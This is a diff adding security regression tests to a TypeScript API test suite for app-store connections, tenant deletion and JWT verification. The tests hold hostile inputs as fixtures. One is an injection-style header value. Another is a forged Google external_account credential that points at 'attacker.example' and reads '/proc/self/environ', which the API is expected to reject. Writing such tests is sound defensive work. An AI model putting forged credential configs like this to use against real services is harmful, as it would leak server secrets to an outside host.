@@ -21,10 +21,16 @@ let api: FastifyInstance;
 const sent: Array<{ name: QueueName; data: object }> = [];
 const jobs: Sender = { send: async (name, data) => void sent.push({ name, data }) };
 
+const deletedPrefixes: string[] = [];
 const uploads: ObjectStorage = {
   presignPut: async (key) => `https://uploads.example.test/${key}?X-Amz-Signature=abc`,
+  size: async () => 10,
   get: async () => new Uint8Array(),
   put: async () => undefined,
+  deletePrefix: async (prefix) => {
+    deletedPrefixes.push(prefix);
+    return 1;
+  },
 };
 
 async function token(claims: Record<string, unknown>): Promise<string> {
@@ -82,6 +88,16 @@ describe("API v1", () => {
     expect(spec.body.components.schemas.LinkExperimentRequest.properties.attributionMode).toBeDefined();
   });
 
+  it("authenticates percent-encoded paths and validates the publisher header", async () => {
+    expect((await call("GET", "/%761/apps")).status).toBe(401);
+    expect((await call("GET", "/%761/onboarding")).status).toBe(401);
+    expect((await call("GET", "/v1/apps", await service(), undefined, { "x-loomit-publisher-id": "bad id;drop" })).status).toBe(400);
+    expect((await call("GET", "/v1/apps/x/timeseries?from=0001-01-01&to=9999-12-31", await publisherA())).status).toBe(400);
+    expect((await call("GET", "/v1/apps/x/timeseries?from=2020-01-01&to=2026-01-01", await publisherA())).body.details).toEqual(
+      expect.arrayContaining([expect.stringContaining("at most 1100 days")]),
+    );
+  });
+
   it("rejects missing, invalid and role-less tokens", async () => {
     expect((await call("GET", "/v1/apps")).status).toBe(401);
     expect((await call("GET", "/v1/apps", "not-a-jwt")).body).toEqual({ error: "The access token is invalid or expired." });
@@ -98,7 +114,7 @@ describe("API v1", () => {
     const invalid = await call("POST", "/v1/apps", a, { loomitAppId: "app-2", name: "x" });
     expect(invalid.status).toBe(400);
 
-    const put = await call("PUT", `/v1/apps/${appId}/connections/google_play`, a, { serviceAccountJson: JSON.stringify({ type: "service_account", client_email: "sa@x.iam.gserviceaccount.com" }) });
+    const put = await call("PUT", `/v1/apps/${appId}/connections/google_play`, a, { serviceAccountJson: JSON.stringify({ type: "service_account", client_email: "sa@x.iam.gserviceaccount.com", private_key: "-----BEGIN PRIVATE KEY-----\nMIIE\n-----END PRIVATE KEY-----\n" }) });
     expect(put).toMatchObject({ status: 202, body: { store: "google_play", status: "pending" } });
     expect((await call("PUT", `/v1/apps/${appId}/connections/apple_app_store`, a, { issuerId: "short" })).status).toBe(400);
 
@@ -256,6 +272,7 @@ describe("API v1", () => {
     expect((await call("DELETE", `/v1/apps/${appId}/connections/google_play`, await publisherA())).status).toBe(204);
     expect((await call("DELETE", `/v1/apps/${appId}/connections/apple_app_store`, await publisherA())).status).toBe(404);
     expect((await call("DELETE", "/v1/tenants/me", await publisherB())).status).toBe(204);
+    expect(deletedPrefixes).toEqual([expect.stringMatching(/^uploads\/[0-9a-f-]{36}\/$/)]);
     const remaining = await withScope(db.pool, SYSTEM, (client) => client.query("select loomit_publisher_id from tenant"));
     expect(remaining.rows.map((row) => row.loomit_publisher_id)).toEqual(["pub-a"]);
   });
@@ -265,19 +282,41 @@ describe("API v1", () => {
     vi.stubEnv("X3M_GOOGLE_SERVICE_ACCOUNT_JSON", "");
     expect((await call("GET", "/v1/onboarding", a)).body).toMatchObject({ googleServiceAccountEmail: null, appleKeyRole: "Customer Support" });
 
-    const created = await call("POST", "/v1/apps", a, { loomitAppId: "app-x3m", name: "X3M mode", androidPackage: "com.example.x3m" });
+    // A publisher-registered identity cannot use X3M's shared account (H1).
+    const selfRegistered = await call("POST", "/v1/apps", a, { loomitAppId: "app-x3m", name: "X3M mode", androidPackage: "com.example.x3m" });
+    expect(selfRegistered.body.identityVerified).toBe(false);
+    const refused = await call("PUT", `/v1/apps/${selfRegistered.body.id}/connections/google_play`, a, { useX3mServiceAccount: true });
+    expect(refused.status).toBe(409);
+    expect(refused.body.error).toContain("only be used for apps registered by Loomit");
+
+    // Loomit (service role) registers the identity: verified, and unique across tenants.
+    const svc = await service();
+    const created = await call("POST", "/v1/apps", svc, { loomitAppId: "app-x3m", name: "X3M mode", androidPackage: "com.example.x3m" }, { "x-loomit-publisher-id": "pub-a" });
+    expect(created.body.identityVerified).toBe(true);
     const appId = created.body.id as string;
+    const stolen = await call("POST", "/v1/apps", svc, { loomitAppId: "other", name: "Other", androidPackage: "com.example.x3m" }, { "x-loomit-publisher-id": "pub-b" });
+    expect(stolen).toMatchObject({ status: 409, body: { error: "This package or Play reports bucket is already registered to another app." } });
     expect((await call("PUT", `/v1/apps/${appId}/connections/google_play`, a, { useX3mServiceAccount: true })).status).toBe(202);
+    const forged = await call("PUT", `/v1/apps/${appId}/connections/google_play`, a, {
+      serviceAccountJson: JSON.stringify({ type: "external_account", token_url: "https://attacker.example/", credential_source: { file: "/proc/self/environ" } }),
+    });
+    expect(forged.status).toBe(400);
     const notConfigured = await call("POST", `/v1/apps/${appId}/connections/google_play/verify`, a);
     expect(notConfigured.body).toEqual({ store: "google_play", status: "error", error: "X3M's Google service account is not configured on the server." });
 
     vi.stubEnv(
       "X3M_GOOGLE_SERVICE_ACCOUNT_JSON",
-      Buffer.from(JSON.stringify({ type: "service_account", client_email: "reviewsignal@x3m.iam.gserviceaccount.com" })).toString("base64"),
+      Buffer.from(JSON.stringify({ type: "service_account", client_email: "reviewsignal@x3m.iam.gserviceaccount.com", private_key: "-----BEGIN PRIVATE KEY-----\nMIIE\n-----END PRIVATE KEY-----\n" })).toString("base64"),
     );
     expect((await call("GET", "/v1/onboarding", a)).body.googleServiceAccountEmail).toBe("reviewsignal@x3m.iam.gserviceaccount.com");
     const verified = await call("POST", `/v1/apps/${appId}/connections/google_play/verify`, a);
     expect(verified.body).toEqual({ store: "google_play", status: "active", error: null });
+
+    // A publisher changing the package drops verification, and the shared account stops working.
+    const changed = await call("POST", "/v1/apps", a, { loomitAppId: "app-x3m", name: "X3M mode", androidPackage: "com.victim.app" });
+    expect(changed.body.identityVerified).toBe(false);
+    const blocked = await call("POST", `/v1/apps/${appId}/connections/google_play/verify`, a);
+    expect(blocked.body).toEqual({ store: "google_play", status: "error", error: expect.stringContaining("registered by Loomit") });
 
     vi.stubEnv("X3M_GOOGLE_SERVICE_ACCOUNT_JSON", "{not json");
     expect((await call("GET", "/v1/onboarding", a)).body.googleServiceAccountEmail).toBeNull();
@@ -295,9 +334,19 @@ describe("API v1", () => {
       .setProtectedHeader({ alg: "RS256", kid: "k1" })
       .setIssuer("https://id.loomit.example")
       .setAudience("reviewsignal")
+      .setSubject("user-z")
+      .setIssuedAt()
       .setExpirationTime("5m")
       .sign(privateKey);
     await expect(verify(good)).resolves.toMatchObject({ loomit_publisher_id: "pub-z" });
+    const neverExpires = await new SignJWT({ loomit_publisher_id: "pub-z" })
+      .setProtectedHeader({ alg: "RS256", kid: "k1" })
+      .setIssuer("https://id.loomit.example")
+      .setAudience("reviewsignal")
+      .setSubject("user-z")
+      .setIssuedAt()
+      .sign(privateKey);
+    await expect(verify(neverExpires)).rejects.toThrow();
     const wrongAudience = await new SignJWT({}).setProtectedHeader({ alg: "RS256", kid: "k1" }).setIssuer("https://id.loomit.example").setAudience("other").sign(privateKey);
     await expect(verify(wrongAudience)).rejects.toThrow();
   });
